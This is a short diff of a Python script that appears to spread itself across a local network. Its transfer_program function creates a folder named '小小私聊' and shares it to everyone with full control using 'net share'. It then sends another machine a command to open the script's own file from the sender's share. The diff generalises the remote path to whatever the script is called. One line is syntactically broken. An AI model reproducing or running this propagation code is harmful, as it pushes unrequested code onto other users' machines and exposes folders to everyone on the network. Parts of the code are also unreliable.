@@ -368,7 +368,8 @@ def get_IP_prefix(ip_address):
 
 def transfer_program():
     current_path = os.path.realpath(__file__)
-    share_folder = r"E:\小小私聊"
+    file_name = os.path.basename(current_path)
+    share_folder = r"D:\小小私聊"
     local_cmd = "net share Docs={} /grant:everyone,FULL",format=share_folder
     try:
         os.mkdir(share_folder)
@@ -377,10 +378,7 @@ def transfer_program():
     except:
         print("[ - ] error in transfer program")
         pass
-
-
-   
-    remote_cmd = "explorer \\\\ " +getIP()+r"\share\toWho.py"
+    remote_cmd = "explorer \\\\ " +getIP()+"\\小小私聊\\"+file_name
     send_cmd(remote_cmd)
 
 
